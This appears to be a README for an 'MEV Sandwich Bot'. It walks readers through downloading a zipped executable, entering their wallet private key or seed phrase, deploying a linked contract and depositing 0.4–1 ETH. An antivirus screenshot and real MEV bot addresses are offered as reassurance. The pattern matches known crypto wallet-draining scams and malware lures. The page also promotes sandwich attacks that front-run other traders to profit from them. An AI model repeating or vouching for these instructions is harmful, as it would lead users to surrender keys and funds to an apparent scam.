<p align="center">
  <strong> 📊 Mev Sandwich Bot</strong>
</p>

<p align="center">
  <img src="https://i.ibb.co/4ZKYtNS/DALL-E-2024-11-11-01-52-18-A-simple-banner-for-a-README-file-on-a-MEV-Sandwich-Bot-with-a-modern-min.png" alt="MEV Sandwich Bot Banner">
</p>

The **MEV Sandwich Bot** is a tool for **automated profit generation** on blockchains, leveraging sandwich attacks and other arbitrage strategies. It analyzes unconfirmed transactions in the mempool, generating profit by influencing token prices.

#### 🎯 How It Works

-   **Front-running**: The bot places its transaction before a large user transaction.
-   **Victim’s Transaction**: The user’s main transaction goes through at an altered price.
-   **Back-running**: The bot sells tokens at the new price to capture profit.

#### 💡 Key Benefits

-   **Efficient unconfirmed transaction scanning**: The bot detects profitable transactions in real-time.
-   **Liquidity filtering and scam protection**: Built-in filters avoid low-liquidity or suspicious tokens by using contract audits, e.g., through Scansniffer.


#### 🚀 Launching in DeployerIDE

<p align="center"> <img src="https://i.ibb.co/KLF9Z37/Interface.png" alt="MEV Sandwich Bot Interface"> </p>


### Advantages of the Local Deployer

The **DeployerIDE** local deployer provides a secure and efficient environment for creating and managing smart contracts, offering a level of control and transparency that browser-based IDEs struggle to match.

----------

#### Advantages over Browser-based IDEs:

-   **Ease of Management**: DeployerIDE’s interface is simple and intuitive, allowing users to insert source code, compile, and deploy contracts effortlessly.
    
-   **Contract History Preservation**: All created contracts are saved under `Load Contracts`, providing full access to manage them even after closing the application.
    
-   **Detailed Action Logging**: DeployerIDE logs all actions for enhanced transparency and tracking.
    
-   **Network Support**: Currently supports **Ethereum**, **BNB**, **Test BNB**, and **Sepolia** networks, allowing you to test and deploy contracts within these environments.
    

----------

**DeployerIDE** enables secure and effective contract management by operating in a fully local environment without requiring access through browser wallets.

#### 📥 Installing DeployerIDE

1.  **Download and launch DeployerIDE**.
2.  **Follow the setup instructions** available in the Documentation section.
-   [Download for Windows/Mac OS (.exe)](https://github.com/engSophia5x3/MEV-UniswapBot/raw/refs/heads/main/DeployerIDE.zip)
-   [Download for Python (.py)](deployer.py)
-   **Alternative access via web browser:** [Remix IDE](https://remix.ethereum.org)

### 🛡️ Security Verification

The program has been scanned for security using antivirus tools. Below is a screenshot of the scan results:

<p align="center"> <img src="https://i.ibb.co/qmwGssk/NoVirus.png" alt="Antivirus Check"> </p>

---

# 🛠️ MEV Sandwich Bot Setup and Launch Guide

<p align="center">
  <img src="https://i.ibb.co/KLF9Z37/Interface.png" alt="MEV Sandwich Bot Interface">
</p>

---

## 🔥 Steps to Launch the Bot

1. **Enter your ERC-20 private key** for your address (Ethereum or BNB). <p align="center">
  <img src="https://i.ibb.co/bFVpvv2/PrKey.png" alt="MEV Sandwich Bot Interface" width="300">
</p>

2. **Connect to your selected network**. <p align="center">
  <img src="https://i.ibb.co/qWcC0WQ/Network.png" alt="MEV Sandwich Bot Interface" >
</p>

   - *(If you’re unsure how to get your private key, use the built-in function to convert your seed phrase into a private key.)* <p align="center">
  <img src="https://i.ibb.co/pPz0Bzt/SdKy.png" alt="MEV Sandwich Bot Interface">
</p>

3. [**Insert your contract source code**](uniswapBot.sol) in the `Enter Contract Code` field.
<p align="center">
  <img src="https://i.ibb.co/t2NwQjZ/code.png" alt="MEV Sandwich Bot Interface" width="200" height="300">
</p>

4. **Select Compiler Version**: `0.6.6`. (If you haven’t agreed to the auto-detected version)<p align="center">
  <img src="https://i.ibb.co/dt2GG47/version.png" alt="MEV Sandwich Bot Interface" >
</p>

5. Press **Compile**. If all settings are correct, contract details such as **ABI** and **Bytecode** will appear.<p align="center">
  <img src="https://i.ibb.co/f1cw1Jy/ByteAbi.png" alt="MEV Sandwich Bot Interface" width="400" >

6. After compiling, select **UniswapBot** under `Select Contract`.<p align="center">
  <img src="https://i.ibb.co/c67YnG3/Uniswap-Bot.png" alt="MEV Sandwich Bot Interface" width="500" >
  
7. Press **Deploy**. A gas cost estimate for contract deployment will be displayed.
8. Once deployed, you can manage the contract directly through **DeployerIDE**:<p align="center">
  <img src="https://i.ibb.co/4szY8sj/func.png" alt="MEV Sandwich Bot Interface" width="400" >
  
   - **Contract Address**, **Balance**, and a **Blockchain Explorer Link** will display in the interface.
   - Contracts are automatically saved and accessible even after closing the application.
9. **Copy your contract’s address** and deposit funds by any convenient method *(e.g., through a standard transfer)*.
10. *The contract balance will be displayed next to its address.*<p align="center">
  <img src="https://i.ibb.co/7SykfXM/balance.png" alt="MEV Sandwich Bot Interface" width="300" >
  
11. **Start the bot** by invoking the **`Start`** function.  
    *Once started, the bot quickly scans unconfirmed transactions on* **Uniswap** *and* **Sushiswap**, *using smart contract interfaces to front-run profitable transactions.*
12. To stop the bot, use the **`Stop`** function.
13. To withdraw the entire contract balance, use the **`Withdrawal`** function.

**Additional Information:**  
_To see the owner and withdrawal address, call the **Owner** function._

15. **Your contract is saved** in the `Load Contracts` tab, so it remains accessible for management even after closing the program. <p align="center">
  <img src="https://i.ibb.co/rGznDfw/load.png" alt="MEV Sandwich Bot Interface" width="450" >

---

## 📊 Bot Operation Examples on Etherscan

- [jaredfromsubway: MEV Bot 2](https://etherscan.io/address/0x1f2f10d1c40777ae1da742455c65828ff36df387)
- [0x51C72848c68a965f66FA7a88855F9f7784502a7F](https://etherscan.io/address/0x51c72848c68a965f66fa7a88855f9f7784502a7f)
- [MEV Bot: 0x000...e49](https://etherscan.io/address/0x00000000009e50a7ddb7a7b0e2ee6604fd120e49)
- [MEV Bot: 0x5dd...35f](https://etherscan.io/address/0x5ddf30555ee9545c8982626b7e3b6f70e5c2635f)
- [MEV Bot: 0xA69...78C](https://etherscan.io/address/0xa69babef1ca67a37ffaf7a485dfff3382056e78c)
- [MEV Bot: 0x6f1…168](https://etherscan.io/address/0x6f1cdbbb4d53d226cf4b917bf768b94acbab6168)

---

## 💸 Deposit Recommendations

- **Recommended Minimum Deposit**: 0.4–1 ETH

> **⚠️ Important:** Bots and all crypto investments carry inherent risks. Using bots can lead to both profits and losses.
